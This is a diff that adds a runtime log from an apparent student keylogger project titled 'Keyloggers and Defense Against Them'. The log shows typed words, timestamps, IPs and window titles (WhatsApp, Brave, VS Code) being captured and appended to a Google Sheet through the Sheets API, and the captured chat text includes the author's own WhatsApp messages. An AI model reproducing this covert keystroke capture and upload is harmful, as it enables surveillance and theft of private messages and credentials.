@@ -1,0 +1,346 @@
+2023-04-11 22:59:43,789 Converted retries value: 3 -> Retry(total=3, connect=None, read=None, redirect=None, status=None)
+2023-04-11 22:59:43,796 Making request: POST https://oauth2.googleapis.com/token
+2023-04-11 22:59:43,810 Starting new HTTPS connection (1): oauth2.googleapis.com:443
+2023-04-11 22:59:45,156 https://oauth2.googleapis.com:443 "POST /token HTTP/1.1" 200 None
+2023-04-11 22:59:45,162 Starting new HTTPS connection (1): sheets.googleapis.com:443
+2023-04-11 22:59:45,926 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-11 22:59:46,689 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-11 23:00:12,821 hryeyeye
+2023-04-11 23:00:15,680 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:00:15,683 Added row: ['hryeyeye', '2023-04-11 23:00:12', '192.168.56.1', 'New Tab - Brave']
+2023-04-11 23:01:25,939 
+2023-04-11 23:01:26,440 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:01:26,443 Added row: ['\x03\x03\x03', '2023-04-11 23:01:25', '192.168.56.1', 'logger.py - Keyloggers and Defense Against Them - Visual Studio Code']
+2023-04-11 23:04:00,292 
+2023-04-11 23:04:01,279 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:04:01,283 Added row: ['\x03', '2023-04-11 23:04:00', '192.168.56.1', 'Keyloggers and Defense Against Them']
+2023-04-11 23:04:38,807 keylogger
+2023-04-11 23:04:39,371 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:04:39,374 Added row: ['\x16\x06keylogger', '2023-04-11 23:04:38', '192.168.56.1', 'Find and Replace']
+2023-04-11 23:17:23,504 what
+2023-04-11 23:17:23,513 Resetting dropped connection: sheets.googleapis.com
+2023-04-11 23:17:24,540 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:17:24,540 Added row: ['what', '2023-04-11 23:17:23', '192.168.56.1', 'Search']
+2023-04-11 23:18:14,019 ism
+2023-04-11 23:18:14,685 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:18:14,686 Added row: ['ism', '2023-04-11 23:18:14', '192.168.56.1', 'Your battery is running low.']
+2023-04-11 23:19:10,198 isko
+2023-04-11 23:19:10,678 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:19:10,679 Added row: ['isko', '2023-04-11 23:19:10', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:19:11,047 ek
+2023-04-11 23:19:11,512 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:19:11,513 Added row: ['ek', '2023-04-11 23:19:11', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:19:12,566 folder
+2023-04-11 23:19:13,369 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:19:13,371 Added row: ['folder', '2023-04-11 23:19:12', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:19:13,377 me
+2023-04-11 23:19:14,190 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:19:14,192 Added row: ['me', '2023-04-11 23:19:13', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:19:15,834 daal
+2023-04-11 23:19:16,833 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:19:16,835 Added row: ['daal', '2023-04-11 23:19:15', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:19:16,839 e
+2023-04-11 23:19:17,682 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:19:17,686 Added row: ['e', '2023-04-11 23:19:16', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:19:23,147 keylogger.exe
+2023-04-11 23:19:25,039 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:19:25,041 Added row: ['keylogger.exe', '2023-04-11 23:19:23', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:19:25,068 krna..
+2023-04-11 23:19:27,478 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:19:27,481 Added row: ['krna..', '2023-04-11 23:19:25', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:19:27,692 ylogs
+2023-04-11 23:19:30,560 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:19:30,561 Added row: ['ylogs', '2023-04-11 23:19:27', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:19:31,836 lagenge..
+2023-04-11 23:19:35,718 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:19:35,720 Added row: ['lagenge..', '2023-04-11 23:19:31', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:19:35,728 y
+2023-04-11 23:19:40,129 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:19:40,131 Added row: ['y', '2023-04-11 23:19:35', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:19:40,138 i
+2023-04-11 23:19:43,828 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:19:43,829 Added row: ['i', '2023-04-11 23:19:40', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:19:43,845 gger
+2023-04-11 23:19:44,445 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:19:44,447 Added row: ['gger', '2023-04-11 23:19:43', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:19:44,464 wala
+2023-04-11 23:19:45,864 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:19:45,865 Added row: ['wala', '2023-04-11 23:19:44', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:19:45,884 killing
+2023-04-11 23:19:47,507 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:19:47,510 Added row: ['killing', '2023-04-11 23:19:45', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:19:53,009 Keylogger.exe
+2023-04-11 23:19:54,177 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:19:54,178 Added row: ['Keylogger.exe', '2023-04-11 23:19:53', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:24:50,112 @
+2023-04-11 23:24:50,115 Resetting dropped connection: sheets.googleapis.com
+2023-04-11 23:24:50,874 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:24:50,877 Added row: ['@', '2023-04-11 23:24:50', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:06,520 baaki
+2023-04-11 23:25:06,912 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:06,915 Added row: ['baaki', '2023-04-11 23:25:06', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:09,699 and
+2023-04-11 23:25:10,172 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:10,174 Added row: ['and', '2023-04-11 23:25:09', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:13,588 everyone,
+2023-04-11 23:25:14,071 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:14,077 Added row: ['everyone,', '2023-04-11 23:25:13', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:14,084 is
+2023-04-11 23:25:14,540 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:14,541 Added row: ['is', '2023-04-11 23:25:14', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:14,725 file
+2023-04-11 23:25:15,184 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:15,185 Added row: ['file', '2023-04-11 23:25:14', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:16,437 ko
+2023-04-11 23:25:16,937 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:16,939 Added row: ['ko', '2023-04-11 23:25:16', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:17,148 run
+2023-04-11 23:25:17,613 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:17,621 Added row: ['run', '2023-04-11 23:25:17', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:18,029 karo
+2023-04-11 23:25:18,490 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:18,498 Added row: ['karo', '2023-04-11 23:25:18', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:18,506 nd
+2023-04-11 23:25:19,121 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:19,128 Added row: ['nd', '2023-04-11 23:25:18', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:19,136 10
+2023-04-11 23:25:19,597 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:19,598 Added row: ['10', '2023-04-11 23:25:19', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:19,674 min
+2023-04-11 23:25:20,151 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:20,158 Added row: ['min', '2023-04-11 23:25:19', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:20,506 tak
+2023-04-11 23:25:20,971 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:20,972 Added row: ['tak', '2023-04-11 23:25:20', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:21,337 run
+2023-04-11 23:25:21,822 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:21,825 Added row: ['run', '2023-04-11 23:25:21', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:22,268 hone
+2023-04-11 23:25:22,730 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:22,730 Added row: ['hone', '2023-04-11 23:25:22', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:26,021 do..
+2023-04-11 23:25:26,702 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:26,709 Added row: ['do..', '2023-04-11 23:25:26', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:29,621 linux,
+2023-04-11 23:25:30,116 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:30,124 Added row: ['linux,', '2023-04-11 23:25:29', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:31,399 windows,
+2023-04-11 23:25:31,809 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:31,816 Added row: ['windows,', '2023-04-11 23:25:31', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:31,996 mac
+2023-04-11 23:25:32,386 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:32,389 Added row: ['mac', '2023-04-11 23:25:31', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:32,873 jahan
+2023-04-11 23:25:33,265 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:33,273 Added row: ['jahan', '2023-04-11 23:25:32', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:33,505 jahan
+2023-04-11 23:25:33,887 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:33,890 Added row: ['jahan', '2023-04-11 23:25:33', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:34,239 chala
+2023-04-11 23:25:34,630 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:34,639 Added row: ['chala', '2023-04-11 23:25:34', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:35,301 skate
+2023-04-11 23:25:35,771 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:35,772 Added row: ['skate', '2023-04-11 23:25:35', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:37,048 chalao..
+2023-04-11 23:25:37,522 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:37,530 Added row: ['chalao..', '2023-04-11 23:25:37', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:37,537 it
+2023-04-11 23:25:37,931 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:37,934 Added row: ['it', '2023-04-11 23:25:37', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:38,323 will
+2023-04-11 23:25:38,702 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:38,703 Added row: ['will', '2023-04-11 23:25:38', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:40,108 output
+2023-04-11 23:25:40,496 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:40,503 Added row: ['output', '2023-04-11 23:25:40', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:40,842 a
+2023-04-11 23:25:41,301 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:41,303 Added row: ['a', '2023-04-11 23:25:40', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:41,647 csv
+2023-04-11 23:25:42,038 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:42,042 Added row: ['csv', '2023-04-11 23:25:41', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:42,403 file
+2023-04-11 23:25:42,867 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:42,876 Added row: ['file', '2023-04-11 23:25:42', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:43,610 ,
+2023-04-11 23:25:43,995 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:43,997 Added row: [',', '2023-04-11 23:25:43', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:44,224 wo
+2023-04-11 23:25:44,825 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:44,827 Added row: ['wo', '2023-04-11 23:25:44', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:44,854 end
+2023-04-11 23:25:45,231 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:45,233 Added row: ['end', '2023-04-11 23:25:44', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:46,864 karo
+2023-04-11 23:25:47,258 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:47,267 Added row: ['karo', '2023-04-11 23:25:46', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:51,698 everyone
+2023-04-11 23:25:53,215 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:53,218 Added row: ['everyone', '2023-04-11 23:25:51', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:53,227 s
+2023-04-11 23:25:53,608 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:53,616 Added row: ['s', '2023-04-11 23:25:53', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:53,623 to
+2023-04-11 23:25:54,019 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:54,022 Added row: ['to', '2023-04-11 23:25:53', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:54,029 do
+2023-04-11 23:25:54,412 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:54,420 Added row: ['do', '2023-04-11 23:25:54', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:54,428 his
+2023-04-11 23:25:54,818 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:54,819 Added row: ['his', '2023-04-11 23:25:54', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:25:57,616 please
+2023-04-11 23:25:57,996 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:25:57,997 Added row: ['please', '2023-04-11 23:25:57', '192.168.56.1', 'WhatsApp']
+2023-04-11 23:33:07,372 random
+2023-04-11 23:33:07,374 Resetting dropped connection: sheets.googleapis.com
+2023-04-11 23:33:08,114 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:33:08,123 Added row: ['random', '2023-04-11 23:33:07', '192.168.56.1', 'New Tab - Brave']
+2023-04-11 23:33:08,867 value
+2023-04-11 23:33:09,346 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:33:09,354 Added row: ['value', '2023-04-11 23:33:08', '192.168.56.1', 'New Tab - Brave']
+2023-04-11 23:33:10,305 python
+2023-04-11 23:33:11,017 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:33:11,018 Added row: ['python', '2023-04-11 23:33:10', '192.168.56.1', 'New Tab - Brave']
+2023-04-11 23:38:35,613 write
+2023-04-11 23:38:35,615 Resetting dropped connection: sheets.googleapis.com
+2023-04-11 23:38:36,198 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:38:36,203 Added row: ['write', '2023-04-11 23:38:35', '192.168.56.1', 'Random Numbers in Python - GeeksforGeeks - Brave']
+2023-04-11 23:38:36,669 on
+2023-04-11 23:38:37,126 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:38:37,132 Added row: ['on', '2023-04-11 23:38:36', '192.168.56.1', 'Random Numbers in Python - GeeksforGeeks - Brave']
+2023-04-11 23:38:38,130 webcam
+2023-04-11 23:38:38,591 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
